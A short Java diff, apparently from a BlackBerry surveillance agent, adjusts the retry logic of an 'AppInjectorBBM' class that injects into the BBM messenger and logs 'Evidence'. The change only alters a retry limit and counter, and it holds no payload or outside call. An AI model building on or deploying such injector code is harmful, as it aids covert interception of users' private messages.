@@ -36,7 +36,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     private static final long GUID = 0xcb37fa94a62baf5dL;
     private static final int DELAY = 5000;
 
-    private static final int MAX_TRIES = 12;
+    private static final int MAX_TRIES = 8;
     
     private int delay = 100;
     private int tries =0;
@@ -83,11 +83,12 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
                 + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
+        tries++;
         if(tries >= MAX_TRIES){
             //#ifdef DEBUG
             debug.error("callMenuByKey: too many tries");
             //#endif
-            if(tries++ == MAX_TRIES){
+            if(tries == MAX_TRIES){
                 Evidence.info("NO BBM");
             }
             return false;
